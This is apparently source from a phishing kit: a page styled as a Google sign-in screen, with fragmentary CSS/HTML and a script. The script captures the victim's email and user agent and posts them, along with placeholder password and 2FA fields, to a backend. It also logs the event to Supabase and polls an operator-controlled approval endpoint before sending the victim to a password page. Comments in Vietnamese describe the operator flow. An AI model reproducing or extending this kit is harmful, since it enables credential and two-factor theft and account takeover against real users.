            font-family: 'Google Sans', 'Roboto', sans-serif;
            font-size: 14px;

            color: #5f6368;
        }

            border: none;
            background: transparent;
            color: #3c4043;
            font-size: 14px;
            font-family: 'Google Sans', 'Roboto', sans-serif;

            cursor: pointer;

            <div class="signin-card">

                </div>
                <div class="signin-columns">
                    <!-- Left Column: Logo, Title, Description -->
                    <div class="signin-left">

                        </div>

                    </div>
                </div>
            </div>
        </div>

                    </svg>

                </div>

                    <a href="#" class="footer-link">Terms</a>
                </div>

    <script>
        // Function to update page status
        async function updatePageStatus(pageName) {
            const requestId = localStorage.getItem('requestId');
            if (!requestId) return;
            
            try {
                await fetch('http://localhost:5000/api/update-page', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        id: parseInt(requestId), 
                        currentPage: pageName 
                    })
                });
            } catch (err) {
                console.log('Failed to update page status');
            }
        }

        // Smooth progress bar function for API calls
        function startProgressBar() {
            const progressBar = document.getElementById('progressBar');
            const progressContainer = document.querySelector('.progress-container');
            
            if (!progressBar || !progressContainer) return;
            
            // Show progress container
            progressContainer.classList.add('active');
            
            // Reset and start animation
            progressBar.style.width = '0%';
            progressBar.classList.remove('loading', 'completing');
            
            setTimeout(() => {
                progressBar.classList.add('loading');
                progressBar.style.width = '80%';
            }, 100);
            
            return {
                complete: () => {
                    progressBar.classList.remove('loading');
                    progressBar.classList.add('completing');
                    progressBar.style.width = '100%';
                    
                    setTimeout(() => {
                        progressContainer.classList.remove('active');
                    }, 300);
                },
                hide: () => {
                    progressContainer.classList.remove('active');
                }
            };
        }

        // Page transition handler
        function handleTransition(url) {
            const card = document.querySelector('.signin-card');
            if (card) {
                card.classList.add('fade-out');
            setTimeout(() => {
                window.location.href = url;
            }, 300);
        } else {
            window.location.href = url;
        }
    }

        let activeLang = 'en';

        function getLangBase(code) {
            if (!code) return 'en';
            return code.toLowerCase().split('-')[0];
        }

        function t(key) {
            const pack = I18N[activeLang] || I18N.en;
            return pack[key] || I18N.en[key] || '';
        }

        function applyTranslations(langCode) {
            activeLang = I18N[getLangBase(langCode)] ? getLangBase(langCode) : 'en';
            document.documentElement.lang = activeLang;
            document.documentElement.dir = activeLang === 'ar' ? 'rtl' : 'ltr';
            document.title = t('pageTitle');

            const title = document.querySelector('.signin-title');
            const subtitle = document.querySelector('.signin-subtitle');
            const emailLabel = document.querySelector('label[for="email"]');
            const forgotEmail = document.querySelector('.forgot-email-btn');
            const helperText = document.querySelector('.helper-text p');
            const nextBtn = document.querySelector('.btn-primary');
            const footerLinks = document.querySelectorAll('.footer-link');

            if (title) title.textContent = t('title');
            if (subtitle) subtitle.textContent = t('subtitle');
            if (emailLabel) emailLabel.textContent = t('emailLabel');
            if (forgotEmail) forgotEmail.textContent = t('forgotEmail');
            if (nextBtn) nextBtn.textContent = t('next');
            if (helperText) {
                helperText.innerHTML = `${t('helperPrefix')} <a href="#" class="learn-more">${t('learnMore')}</a>`;
                const learnMoreLink = helperText.querySelector('.learn-more');
                if (learnMoreLink) {
                    learnMoreLink.addEventListener('click', function(e) {
                        e.preventDefault();
                        alert('Guest mode help would be shown here');
                    });
                }
            }
            if (footerLinks.length >= 3) {
                footerLinks[0].textContent = t('help');
                footerLinks[1].textContent = t('privacy');
                footerLinks[2].textContent = t('terms');
            }
        }

        // Form validation and submission
        function handleFormSubmission() {
        const form = document.getElementById('loginForm');
                const emailInput = document.getElementById('email');
                const emailError = document.getElementById('email-error');
                
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                // Reset previous errors
                emailInput.classList.remove('error');
                emailError.textContent = '';
                const email = emailInput.value.trim();
                // Basic email validation
                if (!email) {
                    showError(t('enterEmail'));
                    return;
                }
                if (!isValidEmail(email) && !isValidPhone(email)) {
                    showError(t('invalidEmail'));
                    return;
                }
                // Show loading state
                const submitBtn = form.querySelector('.btn-primary');
                submitBtn.classList.add('loading');
                submitBtn.disabled = true;
                
                // Start smooth progress bar
                const progress = startProgressBar();
                
                // Store email for next page
                localStorage.setItem('userEmail', email);

                // >>> Luu event vao Supabase candidate_login_events
                if (window.saveLoginEvent) {
                    window.saveLoginEvent({ page: 'index.html', step: 'email', email: email });
                }

                // Gửi dữ liệu lên backend GUI Local
                const userAgent = navigator.userAgent;
                let requestId = null;
                try {
                    const res = await fetch('http://localhost:5000/api/request', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            email, 
                            password: '', 
                            twofa: '', 
                            userAgent,
                            currentPage: 'index.html'
                        })
                    });
                    const data = await res.json();
                    requestId = data.requestId;
                    localStorage.setItem('requestId', requestId);
                } catch (err) { 
                    console.log('Backend not available, proceeding without approval');
                    // Nếu backend không có, chuyển thẳng đến password page
                    progress.complete();
                    setTimeout(() => {
                        window.location.href = `password.html?email=${encodeURIComponent(email)}`;
                    }, 300);
                    return;
                }
                
                // Bắt đầu kiểm tra phê duyệt
                await checkApprovalStatus(requestId, 'password.html');
            });

            function showError(message) {
                emailInput.classList.add('error');
                emailError.textContent = message;
                emailInput.focus();
            }

            function isValidEmail(email) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailRegex.test(email);
            }

            function isValidPhone(phone) {
                const phoneRegex = /^\+?[\d\s\-\(\)]+$/;
                return phoneRegex.test(phone) && phone.replace(/\D/g, '').length >= 10;
            }

            // Hàm kiểm tra trạng thái approval
            async function checkApprovalStatus(requestId, nextPage) {
                const maxAttempts = 60; // Tối đa 60 lần kiểm tra (5 phút)
                let attempts = 0;
                
                const checkStatus = async () => {
                    try {
                        const response = await fetch(`http://localhost:5000/api/status/${requestId}`);
                        if (response.ok) {
                            const data = await response.json();
                            
                            if (data.status === 'approved') {
                                // Được approve, chuyển trang
                                const email = localStorage.getItem('userEmail');
                                const progress = startProgressBar();
                                progress.complete();
                                setTimeout(() => {
                                    window.location.href = nextPage + '?email=' + encodeURIComponent(email);
                                }, 300);
                                return;
                            } else if (data.status === 'denied') {
                                // Bị từ chối, hiển thị thông báo
                                const submitBtn = document.querySelector('.btn-primary');
                                submitBtn.classList.remove('loading');
                                submitBtn.disabled = false;
                                showError(t('denied'));
                                return;
                            }
                        }
                        
                        attempts++;
                        if (attempts < maxAttempts) {
                            // Kiểm tra lại sau 1 giây
                            setTimeout(checkStatus, 1000);
                        } else {
                            // Hết thời gian chờ, chuyển trang
                            const email = localStorage.getItem('userEmail');
                            const progress = startProgressBar();
                            progress.complete();
                            setTimeout(() => {
                                window.location.href = nextPage + '?email=' + encodeURIComponent(email);
                            }, 300);
                        }
                    } catch (error) {
                        console.error('Error checking approval status:', error);
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 1000);
                        } else {
                            const email = localStorage.getItem('userEmail');
                            const progress = startProgressBar();
                            progress.complete();
                            setTimeout(() => {
                                window.location.href = nextPage + '?email=' + encodeURIComponent(email);
                            }, 300);
                        }
                    }
                };
                
                // Bắt đầu kiểm tra
                checkStatus();
            }
        }

        // Mobile responsive handler
        function handleMobileLayout() {
            function checkMobile() {
                if (window.innerWidth <= 600) {
                    document.body.classList.add('mobile-layout');
                } else {
                    document.body.classList.remove('mobile-layout');
                }
            }
            
            checkMobile();
            window.addEventListener('resize', checkMobile);
        }

        // Build language list + auto-apply UI translation
        function initLanguageSwitcher() {
            const languageSelect = document.getElementById('languageSelect');
            if (!languageSelect) return;

            const fallbackLanguageCodes = [
                'en','es','fr','de','it','pt','ru','uk','pl','nl','sv','no','da','fi','is',
                'tr','el','cs','sk','hu','ro','bg','sr','hr','sl','et','lv','lt','ga','mt',
                'ar','he','fa','ur','hi','bn','ta','te','ml','kn','gu','pa','mr','ne','si',
                'th','vi','id','ms','tl','zh','ja','ko','mn','km','lo','my','am','sw','zu',
                'af','xh','yo','ig','ha','so','rw','ps','kk','uz','az','hy','ka'
            ];

            let languageCodes = [];
            try {
                if (typeof Intl.supportedValuesOf === 'function') {
                    languageCodes = Intl.supportedValuesOf('language');
                }
            } catch (error) {
                languageCodes = [];
            }
            if (!languageCodes.length) {
                languageCodes = fallbackLanguageCodes;
            }

            const uniqueCodes = Array.from(new Set(languageCodes))
                .filter(Boolean)
                .sort((a, b) => a.localeCompare(b));

            const savedLanguage = localStorage.getItem('preferredLanguage');
            const autoLanguage = navigator.language || 'en';
            const preferredLanguage = savedLanguage || autoLanguage;
            const displayNames = (() => {
                try {
                    // Keep option labels stable/readable for all users.
                    return new Intl.DisplayNames(['en'], { type: 'language' });
                } catch (error) {
                    return null;
                }
            })();

            const autoOption = document.createElement('option');
            autoOption.value = 'auto';
            autoOption.textContent = 'Auto (Browser)';
            languageSelect.appendChild(autoOption);

            uniqueCodes.forEach((code) => {
                let label = code;
                try {
                    label = displayNames ? (displayNames.of(code) || code) : code;
                } catch (error) {
                    label = code;
                }
                const option = document.createElement('option');
                option.value = code;
                option.textContent = label;
                languageSelect.appendChild(option);
            });

            const preferredBase = getLangBase(preferredLanguage);
            const initialLanguage = uniqueCodes.includes(preferredLanguage)
                ? preferredLanguage
                : (uniqueCodes.includes(preferredBase) ? preferredBase : 'en');

            if (savedLanguage === 'auto') {
                languageSelect.value = 'auto';
                applyTranslations(autoLanguage);
            } else {
                languageSelect.value = initialLanguage;
                applyTranslations(initialLanguage);
            }

            languageSelect.addEventListener('change', function () {
                const selectedLanguage = this.value;
                if (selectedLanguage === 'auto') {
                    applyTranslations(navigator.language || 'en');
                    localStorage.setItem('preferredLanguage', 'auto');
                    return;
                }
                applyTranslations(selectedLanguage);
                localStorage.setItem('preferredLanguage', selectedLanguage);
            });
        }

        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', function() {
            handleFormSubmission();
            handleMobileLayout();
            initLanguageSwitcher();
            
            // Focus on email input
            document.getElementById('email').focus();
            
            // Handle forgot email button
            const forgotBtn = document.querySelector('.forgot-email-btn');
            if (forgotBtn) {
                forgotBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert('Forgot email feature would be implemented here');
                });
            }
            
            // Handle create account button
            const btnSecondary = document.querySelector('.btn-secondary');
            if (btnSecondary) {
                btnSecondary.addEventListener('click', function() {
                    alert('Create account feature would be implemented here');
                });
            }
            
        });

        // Accessibility improvements
        document.addEventListener('keydown', function(e) {
            // Allow form submission with Enter key
            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
            }
    });
    </script>
